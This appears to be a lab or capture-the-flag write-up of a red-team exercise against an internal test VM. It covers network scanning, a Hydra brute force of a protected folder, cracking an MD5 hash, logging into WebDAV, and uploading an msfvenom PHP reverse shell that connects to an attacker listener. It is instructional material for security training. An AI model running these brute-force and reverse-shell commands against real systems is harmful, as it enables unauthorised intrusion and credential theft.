# Red Team

The following commands are executed from the attacker's machine running Kali Linux, which is already part of the internal network. Because the target is an internal Capstone VM and not an external site, there's no need to perform OSINT or Recon-NG in this scenario. The engagement involves discovering the server’s IP address, locating a hidden directory, using brute force techniques to gain access, connecting via WebDAV, uploading a PHP reverse shell, and ultimately finding and capturing the flag within the hidden directory.

## Execution
<details>
<summary> <b> Step 1: Discover the IP address of the Linux server  </b> </summary>

Identify the IP address of Kali VM with command: `Ipconfig`

![image](https://github.com/user-attachments/assets/824d5f5d-ea1c-4eea-bdbf-3fcd5bda2c5d)

To discover the IP address we will need to use Nmap to scan your network.

- Opening Kali terminal, using the command: `nmap 192.168.1.0/24`

![image](https://github.com/user-attachments/assets/e1781c64-e465-4f1f-942e-bb228fe32dbc)

Netdiscover is another tool that can be used to inspect IP address and network ARP traffic.

Command: `netdiscover -r 192.168.1.0/24`

![image](https://github.com/user-attachments/assets/5e469f12-c64e-4f1c-a944-004260417f36)

Nmap discovered 256 IP addresses with 4 hosts up. On VM IP address: 192.168.1.105, there were 2 open ports: 22 and 80 which was interesting. To determine the versions of the service running on the ports, use the command: `nmap -sV 192.168.1.105`

![image](https://github.com/user-attachments/assets/f336a2e8-4677-4a04-be42-8e894edba2b1)

Using `dirb` , as a web content scanner, we can locate hidden and existing directory web objects. Another method since port 80 is open, we can open a web browser and put in the ip address: `192.168.1.105`

![image](https://github.com/user-attachments/assets/01a8df7e-f428-414a-b2d4-63b28c15d778)
</details>	





<details>
<summary> <b> Step 2: Locate the hidden directory on the server </b> </summary>
  
Navigating through the directory comes to a folder called secret_folder which asks for authentication in order to access. Reading the authentication method reads "For Asthon's eyes only."

![image](https://github.com/user-attachments/assets/51787feb-6bca-448e-b546-761b7d831c08)

![image](https://github.com/user-attachments/assets/80ccab65-f8a5-485b-94b4-e619354d67b4)

![image](https://github.com/user-attachments/assets/20e7518b-911e-4cf2-a8d4-511d1bb27bc1)

Note: In addition to manually searching folders, we could:
- Check the host again with ping: `nmap -pn 192.168.1.0/24`
- Scan for open ports and versions: `nmap -sV 192.168.1.1-105`
- On the Capstone VM (`ip:192.168.1.105`) there is one open `port:80` which is a significant vulnerability I can exploit. We also learn about the `Apache server version 2.4.29` and the `OS of Linux`
- Checking for OS: `nmap -sS -A 192.168.1.105` 
- `wget 192.168.1.105/meet_our_team/ashton.txt | cat ashton.txt`

Another option is also to run an nmap script that can reveal hidden files and directories : `nmap --script http-enum -p80 192.168.1.105` Here `http-enum` is an NSE (Nmap scripting engine) script provides insights regarding the types of servers and applications in use within the subnet.
</details>	





<details>
<summary> <b> Step 3: Brute force the password for the hidden directory </b> </summary>

We will find Asthon's username and password by brute force against the hidden directory by using Hydra.

- Using Ashton's name, run the Hydra attack against the directory:
  - Using the command: `hydra -l ashton -P rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /customer_folders/secret_folder`
-Once brute force attack is finished, you will find the username is `ashton` and the password is `leopoldo`.

![image](https://github.com/user-attachments/assets/31c2e658-7192-4c03-9341-3deddbd12b76)

- After logging in with the credentials, navigate on the browser to the secret folder and will go to connect_to_corp_server page indicating a personal note left by Asthon of how to connect to the companies webdavserver with Ryan's account information.

![image](https://github.com/user-attachments/assets/529ffb7d-8450-47a3-abd3-b6db925ba152)

- Break the hashed password with Crack station website or John the Ripper.
  - For John the Ripper, use the command: `john  --format=raw-md5 ryan_hash`

![image](https://github.com/user-attachments/assets/8d1a043a-70cb-4eae-badb-a4d85c050c07)

- Using https://crackstation.net to crack the hash, paste the password hash and fill out the CAPTCHA; and click on Crack Hashes:

![image](https://github.com/user-attachments/assets/de67aefd-391b-46f4-9807-a84d11296264)

- Breaking the hashed password reviewed Ryan's password is `linux4u`.
</details>





<details>
<summary> <b> Step 4: Connect to the server via WebDAV </b> </summary>

Connect to the VM's WebDAV directory by following the instructions on the secret_folder.

- Open the `File System` on the desktop.
- Click on `Browse Network`.
- In the URL bar, type: `dav:192.168.1.105/webdav`
- Enter the credentials:
  - Username: `ryan`
  - Password: `linux4u`

![image](https://github.com/user-attachments/assets/a50dc533-6e0c-44a8-b72e-e7b1bfd63142)
</details>





<details>
<summary> <b> Step 5: Upload a PHP reverse shell payload. </b> </summary>

To do this, on my Kali VM I can use msfvenom to create a reverse shell payload script in Kali Linux (hacker's VM). This payload when run on the victim machine (capstone VM) can extablish a retrograde connection with Kali linux on the Hacker's machine (Kali VM) and open up session and a terminal to execute additional code. This is where the Exploitation phase ends and the post-exploitation starts.

Command: `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw > shell.php`

![image](https://github.com/user-attachments/assets/d355def3-8daf-40bd-854d-9a28a6bd45e1)

Now in Kali VM run Metasploit and run the following commands to prepare for listening and being ready to accept any retrograde connection coming from Capstone VM(victim).

- Setting up a listener by following a series of command:
  - `msfconsole` to launch `msfconsole`
  - `use exploit/multi/handler`
  - `set payload php/meterpreter/reverse_tcp`
  - show options and point out they need to set the `LHOST` and `LPORT`.
  - `set LHOST 192.168.1.90`
  - `set LPORT 4444`
  - `exploit`

![image](https://github.com/user-attachments/assets/4ddac98b-2556-427a-81f7-8e952a77953a)

![image](https://github.com/user-attachments/assets/64016f08-2f17-4667-b255-8bbfb29d298e)

- When exploit is set up, we will place the shell.php file inside the webDAV. Once placed in the webDAV, we will activate the payload and open up a meterpreter session.

![image](https://github.com/user-attachments/assets/a94f2ef2-fcfa-446c-815c-b545be30338e)
</details>





<details>
<summary> <b> Step 6: Find and capture the flag </b> </summary>

Once a Meterpreter shell is open you can run the following commands like getuid, getwd, sysinfo to gather dditional information about the hacked system. If you type shell the terminal will change to shell and then you can run additional commands such as finding files etc.
  
- On the listener, we will search for the flag found inside the root directory, which is named flag.txt
  - Run command: `shell`
  - locate `flag.txt`
  - `cat /flag.txt`

Note: Another way instead of jumping through files would be to: `find -name flag.txt 2>/dev/null` Here `2>dev/null` is instructing to ignore any error messages while searching.

![image](https://github.com/user-attachments/assets/3185fc42-d926-4f33-822b-0ba845715063)
</details>


